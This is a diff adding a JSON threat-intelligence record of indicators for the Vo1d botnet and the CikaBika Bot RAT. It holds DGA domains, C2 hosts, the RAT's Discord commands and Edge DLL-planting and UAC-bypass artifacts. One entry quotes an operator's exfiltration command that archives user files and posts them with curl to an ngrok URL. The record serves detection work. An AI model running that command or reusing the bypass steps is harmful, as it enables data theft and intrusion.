@@ -1,0 +1,625 @@
+{
+  "malware_family": "Vo1d",
+  "threat_actor": "",
+  "platforms": [
+    "android",
+    "windows"
+  ],
+  "summary": "Vo1d is a large-scale Android TV botnet that uses DGA seeds to compute C2 domains and beacons to cloud-hosted infrastructure over non-standard high ports (TCP 55520/55521). The same report page also details CikaBika Bot, a Nim loader that sideloads a Rust RAT as dbghelp.dll into Microsoft Edge, uses Discord channels for C2, and exfiltrates via ngrok. Detection anchors include DGA domains sharing the seed suffixes 60b33d7929a and fc975904fc9, Vo1d C2 hosts, and CikaBika's Discord command set and Edge DLL-planting paths.",
+  "mitre_techniques": [
+    "T1071.004",
+    "T1568.002",
+    "T1568.001",
+    "T1571",
+    "T1204.002",
+    "T1036.007",
+    "T1059.001",
+    "T1027",
+    "T1140",
+    "T1548.002",
+    "T1112",
+    "T1574.001",
+    "T1036.005",
+    "T1082",
+    "T1016",
+    "T1057",
+    "T1113",
+    "T1059.003",
+    "T1102.002",
+    "T1560.001",
+    "T1567",
+    "T1070.004",
+    "T1218.010",
+    "T1005",
+    "T1074.001",
+    "T1041",
+    "T1564.003",
+    "T1027.013"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "unique_string",
+      "value": "60b33d7929a",
+      "context": "Vo1d DGA seed: first five chars vary, this trailing part stays constant",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "fc975904fc9",
+      "context": "Second Vo1d DGA seed suffix, not previously reported by OSINT vendors",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet.img",
+      "context": "Disk image delivering the CikaBika campaign",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Presentation_Generale.pdf.pdf",
+      "context": "Decoy PDF inside the disk image",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet_Personnalisable.docx",
+      "context": "LNK shortcut disguised as a Word document",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "XOR-decoded payload written and executed via cmd /c",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "$data[239]",
+      "context": "PDF byte at offset 239 (0x20) used as XOR key for embedded payload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "Planted DLL path for Edge search-order hijacking",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "Staged DLL before UAC-bypass move into Edge directory",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "Modified so computerdefaults.exe triggers the DLL move (UAC bypass)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "computerdefaults.exe",
+      "context": "Launched to trigger hijacked ms-settings command",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "regsvr32.exe",
+      "context": "Invoked when Nim loadLib fails, then DLL load retried",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "msedge.exe",
+      "context": "Legitimate binary with delay-loaded dbghelp.dll dependency",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ApplicationFrameHost",
+      "context": "Window hidden by the compiled C# UAC-bypass helper",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dbghelp.dll",
+      "context": "Malicious Rust RAT masquerading as Edge debug library",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tasklist_startup.txt",
+      "context": "Process enumeration output collected by RAT",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "network_info.txt",
+      "context": "ipconfig output uploaded to Discord",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "screenshot.png",
+      "context": "Screenshot captured by RAT reconnaissance",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "dllFile",
+      "context": "Loader variable holding the decoded Rust DLL",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "copyPs1",
+      "context": "Loader variable holding the PowerShell deployment script",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "loadLib",
+      "context": "Nim function used to load the dropped DLL",
+      "specificity": "low",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "ShowWindow",
+      "context": "C# helper call used to hide Settings/ApplicationFrameHost windows",
+      "specificity": "low",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "!shell powershell -Command \"Compress-Archive -Path 'C:\\Users\\<redacted>' -DestinationPath 'C:\\Users\\<redacted>' -Force\" && curl -X POST \"https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip\" -H \"Content-Type: application/octet-stream\" --data-binary \"@C:\\Users\\<redacted>ES .zip\"",
+      "context": "Operator 'sousou.ps1' issued via Discord; RAT dbghelp.dll is the parent",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "!download C:\\Users\\",
+      "context": "Operator command to retrieve a document from victim desktop",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "tasklist",
+      "context": "Recon process enumeration run by the RAT at startup",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ipconfig",
+      "context": "Recon network configuration run by the RAT at startup",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device is ready for manual commands",
+      "context": "RAT greeting message posted into the device Discord channel",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!shell",
+      "context": "Discord command for remote command execution",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!sysinfo",
+      "context": "Discord command returning host details",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!isOn",
+      "context": "Discord command for status check",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!src",
+      "context": "Discord command handler referencing screenshots",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!camera",
+      "context": "Discord command handler referencing camera access",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!stream",
+      "context": "Discord command handler referencing streaming",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!broadcast",
+      "context": "Discord command handler referencing broadcasting",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!tasklist",
+      "context": "Discord command for process enumeration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!ps",
+      "context": "Discord command for process enumeration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!kill",
+      "context": "Discord command for process termination",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!upload",
+      "context": "Discord command for file transfer to victim",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!download",
+      "context": "Discord command for file retrieval from victim",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "🖥️Device Registered",
+      "context": "Discord embed title posted on device registration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "✅ جهاز جديد تم تسجيله بنجاح",
+      "context": "Arabic device-registration embed description",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device Management System",
+      "context": "Footer of the RAT's Discord registration embed",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device ID: e9fc8fb4",
+      "context": "Embed footer device identifier in registration message",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "3.132.75.97",
+      "context": "Likely Vo1d C2 infrastructure",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "g.sxim.me",
+      "context": "Likely Vo1d C2 infrastructure",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "snakeers.com",
+      "context": "Likely Vo1d C2 infrastructure",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "semhz60b33d7929a.com",
+      "context": "Vo1d DGA C2 endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ggqrb60b33d7929a.com",
+      "context": "Vo1d DGA C2 endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "eusji60b33d7929a.com",
+      "context": "Vo1d DGA C2 endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "uacfc60b33d7929a.com",
+      "context": "Vo1d DGA C2 endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "qilqxfc975904fc9.top",
+      "context": "Vo1d DGA C2 endpoint using second seed",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "/[a-z]{5}fc975904fc9\\.(com|top|net)/",
+      "context": "Second DGA seed pattern observed in Darktrace telemetry",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "TCP 55520",
+      "context": "Post-resolution outbound C2 port to DGA-resolved hosts",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "TCP 55521",
+      "context": "Post-resolution outbound C2 port to DGA-resolved hosts",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "AS16509 (AMAZON-02)",
+      "context": "Cloud ASN hosting Vo1d redirectors and C2 nodes",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://discord.com/api/v10/channels/",
+      "context": "Discord API base the Rust RAT uses for channel C2",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "MTQzMjcyMjA4Mzk5NzAyODUxMg.GJpNS2.CE19P...",
+      "context": "Discord bot token loaded as plaintext literal in RAT config",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "1440633973104705547",
+      "context": "Discord channel ID loaded from RAT config",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip",
+      "context": "ngrok endpoint used to exfiltrate the compressed archive",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "Used by RAT registration to fetch victim public IP",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cdn.discordapp.com",
+      "context": "Discord attachment host for exfiltrated network_info.txt",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "apk",
+    "pe",
+    "script",
+    "document",
+    "archive"
+  ]
+}
